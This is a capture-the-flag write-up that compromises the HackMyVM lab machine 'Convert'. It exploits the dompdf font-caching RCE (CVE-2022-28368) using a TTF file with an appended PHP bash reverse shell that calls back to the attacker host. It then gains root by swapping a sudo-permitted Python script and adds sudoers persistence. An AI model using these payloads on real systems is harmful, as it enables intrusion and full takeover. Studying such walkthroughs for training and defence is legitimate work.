# Convert

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Convert | avijneyam | Beginner | HackMyVM |

**Summary:** Convert is a beginner-level vulnerable machine from HackMyVM that focuses on exploiting a web application vulnerability in the dompdf library. The machine hosts an HTML-to-PDF conversion service running dompdf version 1.2.0, which is vulnerable to CVE-2022-28368 - a Remote Code Execution (RCE) vulnerability through font caching. The attack chain begins with network reconnaissance to identify the target, followed by web enumeration to discover the vulnerable PDF conversion service. Exploitation involves creating a malicious font file containing PHP code, embedding it via CSS in an HTML page, and triggering the vulnerability by accessing the cached font file on the server. Initial access is gained as the user `eva`, and privilege escalation is achieved by exploiting a sudo misconfiguration that allows executing a writable Python script as root. The machine demonstrates the importance of keeping third-party libraries updated and properly configuring sudo permissions.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is identifying live hosts on the network. Using a PowerShell network scanning script, I discovered the target machine on the local network:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.104 08:00:27:AA:B8:67 VirtualBox
```

The target machine is identified at IP address **192.168.100.104** with a VirtualBox MAC address, confirming it's a virtual machine running on the network.

### Port Scanning and Service Enumeration

Next, I performed a comprehensive port scan using Nmap to identify all open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ nmap -sC -sV -p- -T4 192.168.100.104
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 14:16 WIB
Nmap scan report for 192.168.100.104
Host is up (0.0061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 d8:7a:1e:74:a2:1a:40:74:91:1f:81:9b:05:7c:9a:f6 (ECDSA)
|_  256 28:9f:f8:ce:7b:5d:e1:a7:fa:23:c1:fe:00:ee:63:24 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: HTML to PDF
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.74 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 9.2p1 Debian 2+deb12u2 - Relatively recent version, likely not vulnerable to known exploits
- **Port 80 (HTTP):** nginx 1.22.1 serving a web application titled "HTML to PDF"
- **Operating System:** Debian Linux (Debian 12)

The web service on port 80 is the most promising attack vector, especially given the descriptive title suggesting a PDF conversion service.

### Web Application Analysis

Accessing the web service on port 80 reveals an HTML-to-PDF conversion interface:

![](image.png)

The web application provides a simple interface for converting web pages to PDF documents. Let me examine the HTML source code to understand how it works:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ curl http://192.168.100.104

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTML to PDF</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <nav>
        <ul>
            <li><a href="/index.php">Home</a></li>
        </ul>
    </nav>
    <div class="box">
        <h1>HTML to PDF</h1>
        <h4>Convert Web Page to PDF Document with High Accuracy</h4>
        <div class="search-container">
            <form method="POST" action="/index.php">
                <input name="url" type="text" class="center-input" placeholder="eg:- https://www.google.com">
                <button class="search-button" type="submit">Convert</button>
            </form>
        </div>
    </div>
    <footer>
        <p>&copy; 2024 HackMyVm. All rights reserved.</p>
    </footer>
</body>

</html>
```

**Analysis:**
- The form accepts a URL parameter via POST request to `/index.php`
- The application takes user-supplied URLs and converts the rendered HTML to PDF
- This suggests a server-side rendering process, which may be exploitable

### Testing Application Behavior

I tested the application with various inputs to understand its behavior:

**Invalid URL Test:**
When providing an improperly formatted URL, the application returns an error:

![](image-2.png)

**External URL Test:**
When providing a valid external URL, the application returns an error indicating it may have restrictions on external requests:

![](image-1.png)

**Local URL Test (SSRF Check):**
Testing if the application can access itself using `http://127.0.0.1/index.php`:

![](image-3.png)

Excellent! The application successfully converted its own page to PDF. This confirms:
1. The application has Server-Side Request Forgery (SSRF) capabilities
2. It can fetch and render local resources
3. The PDF generation is functional

### PDF Metadata Analysis

I downloaded the generated PDF and examined its metadata to identify the underlying technology:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ curl -O http://192.168.100.104/upload/9e7c31afa4042b421d8df7135f8445d7.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2496 100  2496   0     0 18487     0  --:--:-- --:--:-- --:--:-- 18626

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ exiftool 9e7c31afa4042b421d8df7135f8445d7.pdf
ExifTool Version Number         : 13.36
File Name                       : 9e7c31afa4042b421d8df7135f8445d7.pdf
Directory                       : .
File Size                       : 2.5 kB
File Modification Date/Time     : 2026:02:12 14:35:44+07:00
File Access Date/Time           : 2026:02:12 14:35:44+07:00
File Inode Change Date/Time     : 2026:02:12 14:35:44+07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Media Box                       : 0.000, 0.000, 595.280, 841.890
Producer                        : dompdf 1.2.0 + CPDF
Create Date                     : 2026:02:12 07:35:01+00:00
Modify Date                     : 2026:02:12 07:35:01+00:00
Title                           : HTML to PDF
```

**Critical Discovery:** The PDF was generated by **dompdf 1.2.0 + CPDF**

This version of dompdf is known to be vulnerable to CVE-2022-28368.

---

## Vulnerability Research

### CVE-2022-28368: dompdf RCE via Font Caching

Research on dompdf 1.2.0 reveals a critical Remote Code Execution vulnerability:

**CVE Details:** https://nvd.nist.gov/vuln/detail/CVE-2022-28368

**Vulnerability Summary:**
- **Affected Version:** dompdf < 2.0.0
- **Vulnerability Type:** Remote Code Execution (RCE)
- **Attack Vector:** Malicious font file injection
- **Severity:** High

**Exploitation Mechanism:**
1. dompdf allows loading external fonts via CSS `@font-face` directive
2. When a custom font is loaded, dompdf caches it in `/dompdf/lib/fonts/` directory
3. The cached font file is named using the pattern: `<font_name>_<style>_<md5_of_url>.php`
4. If the font file contains PHP code, it can be executed by accessing the cached file directly
5. The application does not properly validate or sanitize font files before caching them

**Reference Exploit Guide:** https://exploit-notes.hdks.org/exploit/web/dompdf-rce/

---

## Initial Access

### Exploitation Strategy

The exploitation process involves:
1. Creating a malicious font file (TTF) containing PHP code
2. Hosting the malicious font on an attacker-controlled server
3. Creating an HTML page with CSS that references the malicious font
4. Making the vulnerable application process the HTML page
5. Triggering the cached PHP file to execute the payload

### Preparing the Exploit Files

**Step 1: Find and Prepare a Valid TTF Font File**

I need a legitimate TTF font file to use as a base. I searched the system for available TTF files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ find / -name "*.ttf" 2>/dev/null
/usr/lib/ruby/3.3.0/rdoc/generator/template/darkfish/fonts/Lato-Regular.ttf
/usr/lib/ruby/3.3.0/rdoc/generator/template/darkfish/fonts/Lato-LightItalic.ttf
/usr/lib/ruby/3.3.0/rdoc/generator/template/darkfish/fonts/Lato-RegularItalic.ttf
/usr/lib/ruby/3.3.0/rdoc/generator/template/darkfish/fonts/SourceCodePro-Bold.ttf
/usr/lib/ruby/3.3.0/rdoc/generator/template/darkfish/fonts/SourceCodePro-Regular.ttf
/usr/lib/ruby/3.3.0/rdoc/generator/template/darkfish/fonts/Lato-Light.ttf
/usr/lib/gophish/static/font/glyphicons-halflings-regular.ttf
/usr/lib/gophish/static/font/fontawesome-webfont.ttf
^C
```

I selected `fontawesome-webfont.ttf` and renamed it to `exploit.php`, then appended PHP code for a reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ cp /usr/lib/gophish/static/font/fontawesome-webfont.ttf ./exploit.php

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ echo '<?php system("bash -c '\''bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'\''"); ?>' >> ./exploit.php
```

**Why this works:** 
- TTF files are binary files with specific headers that dompdf recognizes as valid fonts
- PHP doesn't care about binary data before the `<?php` tag
- When executed as PHP, it will ignore the binary font data and execute our PHP code

**Step 2: Create Malicious CSS File**

The CSS file uses `@font-face` to reference our malicious "font":

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ vim exploit.css

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ cat exploit.css
@font-face {
  font-family: 'exploitfont';
  src: url("http://192.168.100.1:8080/exploit.php");
  font-weight: normal;
  font-style: normal;
}
```

**Explanation:**
- `font-family: 'exploitfont'` - Defines a custom font named "exploitfont"
- `src: url("http://192.168.100.1:8080/exploit.php")` - Points to our malicious PHP file
- When dompdf processes this CSS, it will download `exploit.php` and cache it

**Step 3: Create HTML Payload**

The HTML file applies the malicious font to trigger the download:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ vim exploit.html

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ cat exploit.html
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="http://192.168.100.1:8080/exploit.css">
</head>
<body>
    <div style="font-family: 'exploitfont';">
        New Font...
    </div>
</body>
</html>
```

**Explanation:**
- Links to our CSS file which contains the `@font-face` directive
- Applies the font to a div element to ensure dompdf processes and downloads it

### Triggering the Vulnerability

**Step 1: Start HTTP Server**

Host the exploit files on an attacker-controlled web server:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ python3 -m http.server 8080
```

**Step 2: Submit the Exploit URL**

Navigate to the web application and submit the URL to our malicious HTML file:

![](image-4.png)

Input: `http://192.168.100.1:8080/exploit.html`

Click the "Convert" button to trigger the PDF generation process.

**Step 3: Verify Font Caching**

The application successfully processed the HTML and cached our malicious font:

![](image-5.png)

The server logs confirm the requests:

```bash
172.21.32.1 - - [12/Feb/2026 17:09:01] "GET /exploit.html HTTP/1.1" 200 -
172.21.32.1 - - [12/Feb/2026 17:09:01] "GET /exploit.css HTTP/1.1" 200 -
172.21.32.1 - - [12/Feb/2026 17:09:01] "GET /exploit.php HTTP/1.1" 200 -
```

**What happened:**
1. dompdf fetched our `exploit.html` file
2. Parsed the CSS and found the custom font reference
3. Downloaded `exploit.php` (our malicious TTF+PHP file)
4. Cached it in `/dompdf/lib/fonts/` directory with a predictable name

### Calculating the Cached Filename

The cached file follows the naming pattern: `<font_name>_<style>_<md5>.php`

Where:
- `font_name` = "exploitfont" (from our CSS)
- `style` = "normal" (from our CSS)
- `md5` = MD5 hash of the font URL

Calculate the MD5 hash:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ echo -n "http://192.168.100.1:8080/exploit.php" | md5sum
b529ec05d3eb9b978eedb11db3c2124e  -
```

**Predicted cached filename:** `exploitfont_normal_b529ec05d3eb9b978eedb11db3c2124e.php`

**Full path:** `/dompdf/lib/fonts/exploitfont_normal_b529ec05d3eb9b978eedb11db3c2124e.php`

### Executing the Payload

**Step 1: Set Up Netcat Listener**

Prepare to catch the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Step 2: Trigger the Cached PHP File**

Access the cached PHP file via HTTP to execute our reverse shell payload:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ curl "http://192.168.100.104/dompdf/lib/fonts/exploitfont_normal_b529ec05d3eb9b978eedb11db3c2124e.php"
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal
Warning: anyway, or consider "--output <FILE>" to save to a file.
```

**Step 3: Receive Reverse Shell**

Success! The reverse shell connects back:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 57653
bash: cannot set terminal process group (488): Inappropriate ioctl for device
bash: no job control in this shell
eva@convert:/var/www/html/dompdf/lib/fonts$
```

We have successfully gained initial access to the target system as the user `eva`.

### Shell Stabilization

Upgrade the basic shell to a fully interactive PTY:

```bash
eva@convert:/var/www/html/dompdf/lib/fonts$ cd
cd
eva@convert:~$ python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
<' || python -c 'import pty; pty.spawn("/bin/bash")'
eva@convert:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/convert]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

eva@convert:~$ export SHELL=bash
eva@convert:~$ export TERM=xterm
eva@convert:~$ stty rows 100 cols 200
eva@convert:~$ reset
```

**Shell Stabilization Steps:**
1. Use Python's `pty` module to spawn a pseudo-terminal
2. Background the shell with `Ctrl+Z`
3. Configure the terminal with `stty raw -echo` to pass all input directly
4. Foreground the shell with `fg`
5. Set environment variables (`SHELL`, `TERM`) for proper terminal behavior
6. Configure terminal dimensions for proper display
7. Reset the terminal for clean output

### Initial Enumeration

Verify user context and explore the home directory:

```bash
eva@convert:~$ id
uid=1000(eva) gid=1000(eva) groups=1000(eva)
eva@convert:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
eva:x:1000:1000:eva,,,:/home/eva:/bin/bash
eva@convert:~$ ls -la
total 32
drwx------ 2 eva  eva  4096 Feb 24  2024 .
drwxr-xr-x 3 root root 4096 Feb 22  2024 ..
lrwxrwxrwx 1 root root    9 Feb 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 eva  eva   220 Feb 22  2024 .bash_logout
-rw-r--r-- 1 eva  eva  3526 Feb 22  2024 .bashrc
-rw-r--r-- 1 eva  eva   807 Feb 22  2024 .profile
-rw-r--r-- 1 root root    1 Feb 24  2024 pdf_gen.log
-rw-r--r-- 1 root root 2736 Feb 23  2024 pdfgen.py
-rw-r----- 1 eva  eva    33 Feb 23  2024 user.txt
```

**Key Observations:**
- Running as user `eva` (uid=1000)
- Only two users with shell access: `root` and `eva`
- `.bash_history` is symlinked to `/dev/null` (defensive measure)
- Interesting files: `pdfgen.py` owned by root, and `user.txt` (the user flag)
- The presence of `pdfgen.py` suggests it may be related to privilege escalation

---

## Privilege Escalation

### Sudo Enumeration

Check for sudo privileges:

```bash
eva@convert:~$ which sudo
/usr/bin/sudo
eva@convert:~$ sudo -l
Matching Defaults entries for eva on convert:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User eva may run the following commands on convert:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
```

**Critical Finding:** 
User `eva` can execute `/usr/bin/python3 /home/eva/pdfgen.py` with any arguments as root without a password!

**Vulnerability Analysis:**
- The sudo rule allows executing a Python script located in eva's home directory
- The wildcard `*` allows passing any arguments to the script
- Most importantly: **The script is owned by root but located in a user-writable directory**
- While the file itself is owned by root, we can delete or rename it and create our own version

### Exploitation

The exploitation strategy is straightforward:
1. Create a malicious Python script that spawns a root shell
2. Replace the original `pdfgen.py` with our malicious version
3. Execute the script with sudo

**Step 1: Create Malicious Python Script**

```bash
eva@convert:~$ echo 'import os; os.system("/bin/bash")' > /home/eva/root.py
```

This simple Python script imports the `os` module and executes `/bin/bash`, which will run with root privileges when invoked via sudo.

**Step 2: Replace the Original Script**

```bash
eva@convert:~$ mv /home/eva/pdfgen.py /home/eva/pdfgen_old.py
eva@convert:~$ mv /home/eva/root.py /home/eva/pdfgen.py
```

We rename the original `pdfgen.py` as a backup (optional) and replace it with our malicious script.

**Step 3: Execute with Sudo**

```bash
eva@convert:~$ sudo /usr/bin/python3 /home/eva/pdfgen.py pwned
root@convert:/home/eva# cd
root@convert:~# id
uid=0(root) gid=0(root) groups=0(root)
root@convert:~# whoami
root
root@convert:~# hostname
convert
```

Success! We now have a root shell.

### Capturing the Flags

Retrieve both user and root flags:

```bash
root@convert:~# cat /home/eva/user.txt /root/root.txt
[REDACTED]10d
[REDACTED]25b
```

### Maintaining Persistence (Optional)

For demonstration purposes, I established persistence by configuring sudo access and setting a password:

```bash
root@convert:~# echo 'eva ALL=(ALL:ALL) ALL' > /etc/sudoers.d/eva
root@convert:~# chmod 0440 /etc/sudoers.d/eva
root@convert:~# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/eva: parsed OK
root@convert:~# passwd eva
New password:
Retype new password:
passwd: password updated successfully
root@convert:~# exit
exit
eva@convert:~$ sudo su
[sudo] password for eva:
root@convert:/home/eva# id
uid=0(root) gid=0(root) groups=0(root)
```

**Note:** In a real penetration test, establishing persistence should only be done with explicit authorization and documented thoroughly in the final report.

---

## Attack Chain Summary

1. **Network Reconnaissance**: Identified target at 192.168.100.104 using network scanning, revealing VirtualBox VM on local network segment.

2. **Port Scanning & Service Enumeration**: Performed comprehensive Nmap scan discovering SSH (22/tcp) and HTTP (80/tcp) services. Web service identified as nginx 1.22.1 hosting "HTML to PDF" conversion application.

3. **Web Application Analysis**: Analyzed HTML-to-PDF conversion service through source code review and behavioral testing. Discovered SSRF capability by successfully converting localhost URLs, confirming server-side processing.

4. **Vulnerability Discovery**: Downloaded generated PDF and extracted metadata using exiftool, identifying dompdf 1.2.0 + CPDF as the PDF generation engine. Research revealed CVE-2022-28368 - Remote Code Execution through malicious font file caching.

5. **Exploit Development**: Created three-component exploit: (1) malicious PHP reverse shell appended to legitimate TTF font file, (2) CSS file with @font-face directive referencing malicious font, (3) HTML file applying the custom font to trigger processing.

6. **Exploitation**: Hosted exploit files on attacker-controlled HTTP server (port 8080). Submitted exploit URL through web application interface, causing dompdf to download and cache malicious font file with predictable filename pattern.

7. **Payload Execution**: Calculated cached file path using MD5 hash of font URL (`exploitfont_normal_b529ec05d3eb9b978eedb11db3c2124e.php`). Accessed cached PHP file via HTTP request, triggering reverse shell callback to netcat listener.

8. **Initial Access**: Obtained reverse shell as user 'eva' (uid=1000). Stabilized shell using Python PTY module and proper terminal configuration for full interactive capabilities.

9. **Privilege Escalation - Enumeration**: Executed `sudo -l` revealing critical misconfiguration: user eva permitted to execute `/usr/bin/python3 /home/eva/pdfgen.py` as root without password. Identified vulnerability in sudo rule allowing arbitrary code execution.

10. **Root Access**: Exploited sudo misconfiguration by replacing writable pdfgen.py script with malicious Python code executing `/bin/bash`. Invoked script via sudo, spawning root shell and gaining complete system control.

11. **Objective Achievement**: Retrieved user flag (`[REDACTED]10d`) and root flag (`[REDACTED]25b`), demonstrating full system compromise from initial reconnaissance to complete administrative access.

